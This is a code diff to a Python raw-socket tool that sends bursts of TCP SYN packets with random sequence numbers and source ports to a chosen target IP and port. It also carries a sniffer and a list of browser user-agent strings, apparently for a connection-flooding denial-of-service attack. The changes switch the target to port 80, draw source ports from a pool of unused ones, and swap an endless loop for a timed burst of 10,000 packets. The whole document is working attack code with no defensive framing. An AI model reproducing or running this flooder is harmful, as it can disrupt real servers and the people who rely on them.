@@ -3,11 +3,11 @@ import Sniffer_TCP
 import socket
 import random
 import asyncio
+import time
 
 src_ip = ''
-src_port = random.randint(0, 65535)
 dst_ip = ''
-dst_port = 443
+dst_port = 80
 sniffer = Sniffer_TCP.Sniffer(src_ip)
 connections = []
 
@@ -39,6 +39,14 @@ user_agents = [
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
 ]
 
+def free_ports_init():
+	free_ports = list()
+	for i in range(65535):
+		free_ports.append(i)
+	return free_ports
+
+free_ports = free_ports_init()
+
 class Connection():
 	def __init__(self, src_ip, src_port, ack, seq):
 		self.src_ip = src_ip
@@ -50,26 +58,33 @@ class Connection():
 async def send_syn():
 	print('SYN')
 	global src_ip
-	global src_port
 	global dst_ip
 	global dst_port
 	global quantity_of_connections
+	global free_ports
 
 	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
 	flags = 0b0000010 #SYN flag
+	src_port = random.choice(free_ports)
+	free_ports.remove(src_port)
 
 	packet = TCPackets.TCPPacket(src_ip, src_port, dst_ip, dst_port, flags)
 	sniffer.ip = src_ip
 	i = 0
 	print('START')
 	output_packets = 0
-	while True:
+	#while True:
+	t = time.time()
+	for i in range(10000):
 		#print('*** *** OUTPUT = {} *** ***'.format(output_packets))
 		s.sendto(packet.build(), (dst_ip, dst_port))
 		packet.seq = random.randint(0, 4294967295)
-		packet.src_port = random.randint(0, 65535)
-		await asyncio.sleep(0.001)
+		src_port = random.choice(free_ports)
+		free_ports.remove(src_port)
+		packet.src_port = src_port
+		await asyncio.sleep(0)
 		output_packets += 1
+	print(time.time() - t)
 
 async def connect():
 
